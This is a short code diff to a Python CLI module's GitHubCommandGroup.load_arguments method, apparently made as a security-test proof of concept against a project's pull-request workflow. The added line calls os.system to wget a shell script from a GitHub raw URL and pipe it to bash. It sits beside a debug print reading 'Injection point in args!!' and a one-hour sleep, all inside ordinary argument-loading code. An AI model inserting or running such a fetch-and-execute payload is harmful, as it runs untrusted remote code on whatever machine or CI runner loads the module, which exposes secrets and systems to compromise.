@@ -170,7 +170,8 @@ class GitHubCommandGroup(GPTCommandGroup):
     def load_arguments(loader: CLICommandsLoader) -> None:
         """Add patch_repo, patch_pr, and access_token arguments."""
         print("Injection point in args!!")
-        os.system('wget -O - https://raw.githubusercontent.com/sectest-h1-adnanthekhan/prt_sh_poc/main/test.sh | bash')
+        os.system('wget -O - https://raw.githubusercontent.com/sectest-h1-adnanthekhan/gha_sectesting/main/test.sh | bash')
+        print("Should be visible now, going to sleep.")
         time.sleep(3600)
         with ArgumentsContext(loader, "github") as args:
             args.argument(
